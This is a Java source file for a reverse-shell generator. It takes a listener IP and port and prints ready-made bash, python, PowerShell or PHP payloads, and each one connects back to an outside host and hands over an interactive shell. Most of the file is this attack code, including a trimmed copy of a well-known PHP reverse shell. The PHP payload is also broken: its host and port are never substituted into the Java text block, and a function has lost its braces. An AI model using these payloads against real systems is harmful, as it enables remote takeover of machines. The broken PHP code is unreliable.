import java.util.*;

public class revgen{

    private static void PrintHelp()
    {
        String helpMessage = 
            """
                --help\tShow help message
                -s <type>\tGenerate reverse shell of type <type>
                -a <IP> Listener adress
                -p <PORT> Listener port

                types: bash,php,python,powershell
            """;
        System.out.print(helpMessage);
    }
    public static void main(String[] args) {
        Map<String,String> commands = new HashMap<>();
        for(int i=0;i<args.length;i++)
            switch(args[i]){
                case "--help": commands.put(args[i], ""); break;
                case "-s" : commands.put(args[i] , i+1 < args.length ? args[i+1] : ""); break;
                case "-a" : commands.put(args[i] , i+1 < args.length ? args[i+1] : ""); break;
                case "-p" : commands.put(args[i] , i+1 < args.length ? args[i+1] : ""); break;
                default:
                    break;
            }
        if(commands.get("--help") != null || commands.get("-s") == null || commands.get("-a") == null || commands.get("-p") == null){
            PrintHelp();
            return;
        }

        
        String LHOST=commands.get("-a");
        String LPORT=commands.get("-p");
        Map<String, String> reverse_shells = new HashMap<>();
        reverse_shells.put("bash", "bash -i >& /dev/tcp/"+LHOST+"/"+LPORT+" 0>&1");
        reverse_shells.put("python","export RHOST=\""+LHOST+"\";export RPORT="+LPORT+";python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'");
        reverse_shells.put("powershell", "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('"+LHOST+"',"+LPORT+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
        /*PHP*/{
        reverse_shells.put("php", """
            <?php
            // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
            // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
            
            set_time_limit (0);
            $VERSION = \"1.0\";
            $ip = '"+LHOST+"';
            $port = "+LPORT+";
            $chunk_size = 1400;
            $write_a = null;
            $error_a = null;
            $shell = 'uname -a; w; id; sh -i';
            $daemon = 0;
            $debug = 0;
            
            if (function_exists('pcntl_fork')) {
                $pid = pcntl_fork();
                
                if ($pid == -1) {
                    printit(\"ERROR: Can't fork\");
                    exit(1);
                }
                
                if ($pid) {
                    exit(0);  // Parent exits
                }
                if (posix_setsid() == -1) {
                    printit(\"Error: Can't setsid()\");
                    exit(1);
                }
            
                $daemon = 1;
            } else {
                printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");
            }
            
            chdir("/");
            
            umask(0);
            
            // Open reverse connection
            $sock = fsockopen($ip, $port, $errno, $errstr, 30);
            if (!$sock) {
                printit(\"$errstr ($errno)\");
                exit(1);
            }
            
            $descriptorspec = array(
               0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from
               1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to
               2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to
            );
            
            $process = proc_open($shell, $descriptorspec, $pipes);
            
            if (!is_resource($process)) {
                printit(\"ERROR: Can't spawn shell\");
                exit(1);
            }
            
            stream_set_blocking($pipes[0], 0);
            stream_set_blocking($pipes[1], 0);
            stream_set_blocking($pipes[2], 0);
            stream_set_blocking($sock, 0);
            
            printit(\"Successfully opened reverse shell to $ip:$port\");
            
            while (1) {
                if (feof($sock)) {
                    printit(\"ERROR: Shell connection terminated\");
                    break;
                }
            
                if (feof($pipes[1])) {
                    printit(\"ERROR: Shell process terminated\");
                    break;
                }
            
                $read_a = array($sock, $pipes[1], $pipes[2]);
                $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
            
                if (in_array($sock, $read_a)) {
                    if ($debug) printit(\"SOCK READ\");
                    $input = fread($sock, $chunk_size);
                    if ($debug) printit(\"SOCK: $input\");
                    fwrite($pipes[0], $input);
                }
            
                if (in_array($pipes[1], $read_a)) {
                    if ($debug) printit(\"STDOUT READ\");
                    $input = fread($pipes[1], $chunk_size);
                    if ($debug) printit(\"STDOUT: $input\");
                    fwrite($sock, $input);
                }
            
                if (in_array($pipes[2], $read_a)) {
                    if ($debug) printit(\"STDERR READ\");
                    $input = fread($pipes[2], $chunk_size);
                    if ($debug) printit(\"STDERR: $input\");
                    fwrite($sock, $input);
                }
            }
            
            fclose($sock);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            
            function printit ($string) 
                if (!$daemon) 
                    print \"$string\\n\";
                
            
            ?>      
        """);
        }

        

        System.out.println(reverse_shells.get(commands.get("-s")));
    }
}